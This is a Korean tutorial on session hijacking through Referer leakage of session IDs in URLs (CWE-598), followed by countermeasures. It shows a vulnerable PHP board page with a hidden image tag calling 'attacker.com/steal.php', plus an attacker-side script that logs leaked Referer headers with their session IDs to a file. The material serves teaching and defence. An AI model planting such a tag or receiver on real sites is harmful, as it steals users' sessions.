# 3. 세션 하이재킹

## 개요

- 세션 하이재킹
    - 정의
        - 민감한 정보(예: 세션 ID, 토큰 등)를 URL의 쿼리 문자열로 전달할 경우
        - 정보가 브라우저 히스토리, 로그 파일, Referer 헤더 등을 통해 유출되는 취약점
        - 해당 글의 예시는 CWE-598 기반의 Referer 헤더나 매개변수에 대한 시나리오 위주
            - CWE-598 : Information Exposure Through Query Strings in GET Request
    - 발생 원인
        - HTTPS 미사용되어 암호화 되지 않는 문제
            - 암호화되지 않은 HTTP로 세션 ID가 전송되면, 공격자가 네트워크 상에서 스니핑 동작 가능
        - 세션 ID를 URL 파라미터로 전달하는 세션 ID 관리 방식의 문제
        - 세션 식별자의 예측하여 공격될 경우
            
            
        
- 공격 종류
    - Referer 통해 외부 노출
        - 피해 사이트가 세션 ID를 URL에 포함시켜 전달
        - 이 과정에서 악성 링크나 이미지 태그 같은 존재할 때
        - 브라우저는 외부 요청 시 Referer 헤더에 전체 URL 포함하여 송신
        

- 취약점 영향
    - CSRF와 동일하게 인증 없이 상대 시스템에서 제어 가능한 설정 가능
        - 민간함 정보를 출력
        - 서버에 임의 코드 실행
        - 데이터 변조

---

## 공격 시라니오

1. Referer 통해 외부 노출
    - 참고 사항
        - 사용자가 3-1.php 페이지에 로그인한 상태
        - 이후 악성 페이지(3-1-1.php)의 이미지 태그를 통해 비밀번호 변경 요청을 자동 전송
    - 참고 파일
        - 3-1. php
        - 3-1-1.php
    - 공격 시나리오
        1. 사이트에 접속하여 인증 및 세션을 유지한 상태
        2. 이 사이트에 게시판이 존재하여 외부 도메인으로 연결된 <img> 태그가 존재하는 페이지를 생성된 상태
        
        ```php
        <?php
        // Referrer-Policy 설정이 없음 → Referer 헤더 유출 허용
        $sessionId = $_GET['sessionid'] ?? 'NO_SESSION';
        $postId = $_GET['id'] ?? '1';
        
        // 게시글 데이터 (공격자가 작성한 글 포함)
        $posts = [
            '1' => '<h2>정상적인 글입니다</h2><p>안녕하세요!</p>',
            '5' => '<h2>공격자 글</h2><p>쿠폰 드림! <img src="http://attacker.com/steal.php" style="display:none"></p>'
        ];
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>게시글 보기</title>
        </head>
        <body>
            <h1>세션 ID: <?= htmlspecialchars($sessionId) ?></h1>
        
            <div class="post">
                <?= $posts[$postId] ?? '글이 존재하지 않습니다.' ?>
            </div>
        </body>
        </html>
        ```
        
        1. 브라우저는 이미지를 요청하면서 Referer 헤더에 현재 페이지 URL을 포함하여 전송
        2. 공격자 서버는 Referer에서 세션 ID를 추출하여 저장
        
        ```php
        <?php
        $referer = $_SERVER['HTTP_REFERER'] ?? 'NO_REFERER';
        
        // 유출된 Referer 로그 저장 (세션 ID 포함됨)
        file_put_contents("stolen_sessions.txt", $referer . PHP_EOL, FILE_APPEND);
        
        // 응답은 이미지처럼 보이게
        header("Content-Type: image/png");
        echo base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAnsB9TYqzqgAAAAASUVORK5CYII=");
        
        ```
        

---

## 대책

- URL에 세션 ID 포함하지 않은 로직으로 동작
    - 세션은 쿠키로만 전달
- Referer 통해 외부 노출되지 않게 다음과 같이 설정
    - Referrer-Policy: strict-origin 또는 no-referrer 설정
        
        ```php
        header("Referrer-Policy: no-referrer");
        
        ```
        
    - 예제(3-2.php, 1. Referer 통해 외부 노출 시나리오 사용)
- 세션 하이재킹
    - Secure, HttpOnly, SameSite 설정 + 세션 재발급 및 짧은 만료시간 설정